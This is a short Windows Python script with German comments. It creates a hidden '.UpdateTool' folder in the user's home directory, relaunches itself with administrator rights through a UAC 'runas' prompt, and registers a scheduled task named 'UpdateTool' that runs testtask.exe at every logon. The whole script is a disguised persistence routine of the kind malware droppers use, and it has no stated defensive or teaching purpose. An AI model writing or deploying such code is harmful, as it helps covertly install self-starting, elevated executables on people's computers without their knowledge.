import time
import os
import ctypes, sys
import requests
# zeit festlegen
now = time.strftime("%m-%d-%y--%H-%M-%S")

# tmp zu python holen
temp = os.environ.get('TMP')

# homepath zu python holen
home = os.environ.get('homepath')


# newpath festlegen
newpath = home + r'\.UpdateTool'

# falls newpath nicht existiert erstelle ihn
if not os.path.exists(newpath):
  os.makedirs(newpath)



import os
import sys
import win32com.shell.shell as shell
ASADMIN = 'asadmin'
if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    sys.exit(0)

os.system(r'cmd /c "schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\testtask.exe"')
